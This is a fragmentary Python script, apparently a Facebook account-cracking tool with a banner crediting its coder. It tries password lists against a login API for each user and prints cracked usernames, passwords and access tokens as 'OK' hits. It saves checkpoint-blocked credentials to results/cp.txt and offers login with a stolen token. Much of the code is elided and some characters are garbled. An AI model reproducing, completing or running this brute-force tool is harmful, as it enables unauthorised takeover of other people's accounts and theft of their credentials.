...
#     # #     # #   # ###  ####
	Version: {BM}0.1.4{P}
  Coded by: MAHDI HASAN, Sponsore: SHUVO
		"""
		return banner
	def cpdetect(self):
		__data=input("[?] Terget nama file: ")
		try:
	...
	def proses(self):
		print("")
		op = input(f"[{K}?{P}] SHOW opsi cp [y/t]: ")
		if op in ("y","Y"):
			opsi.append("y")
	...
	def b_api(self,url,user,pwList):
		...
		for pw in pwList:
			...
			if 'access_token' in response.text and 'EAAA' in response.text:
				ok+=1
				print(f"\r\r\33[32;1m[MAHDI-OK] {user} | {pw} | {response.json()['access_token']}\n\33[37;1m",end="")
				...
				if "y" in opsi:
					...
					print(f"\r\33[1;33m[MAHDI-CP] {user} | {pw}          âˆ†\33[37;1m\n",end="")
				...
				if "Masukkan Kode Masuk untuk Melanjutkan" in title:
					...
					if "y" in opsi:
						...
						if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
							...
							print(f"\r\33[1;33m[CP] {user} | {pw}          âˆ†\33[37;1m\n",end="")
					open("results/cp.txt","a").write(user+"|"+pw+"\n")
				break
			else:
...
........................................
	...
	if bingung in ("01","1"):
		...
		try:
			...
			input(f"\n[âœ“] Berhasil login menggunakan token\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
